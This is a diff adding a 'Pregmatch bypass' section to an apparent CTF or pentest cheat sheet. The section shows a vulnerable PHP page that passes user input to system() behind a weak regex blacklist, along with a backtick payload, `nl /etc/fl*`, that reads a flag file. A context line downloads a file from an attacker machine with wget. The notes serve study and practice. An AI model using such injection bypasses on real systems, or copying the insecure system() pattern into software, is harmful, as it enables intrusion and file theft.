@@ -37,6 +37,47 @@ attacker
    then 
    
          wget http://atckerip:python2:serverport/file_in_attacker machine
+ ### Pregmatch bypass
+     
+    <?php
+
+      if ( isset($_GET['sauce']) ){
+          highlight_file(__FILE__);
+      }
+
+      if ( !isset($_COOKIE['sessionHash']) )
+      {
+
+          echo "Something Wrong, try again.";
+          header("Location: ../index.php");
+
+      }
+
+      else if ( $_COOKIE['sessionHash'] == hash("sha256", "guest") )
+      {
+          die("You Need to be admin to use this page.");
+      }
+
+      else if ( $_COOKIE['sessionHash'] == hash("sha256", "admin") )
+      {
+
+          if ( !isset($_GET["name"]) ) { die("Missing Parameters (name) !!"); } 
+          $name = preg_replace('/\$|\(|\)|ls|cat|more|head|tail|pwd|ps|la|;|&|find/i', '', $_GET['name'] );
+
+          system("echo \"Welcome $name\";");
+          header("X-Leak: ?sauce");
+
+      }
+      else
+          die('Something Wrong, try again.');
+      Welcome admin
+   
+  Then in robots.txt
+  Allow /etc/flag
+  
+  bypass  in url... It reads every thing that starts with fl in the direcory
+     
+        `nl /etc/fl*`
       
 # Client side Exploitation
 ## Cross site scripting (XSS)
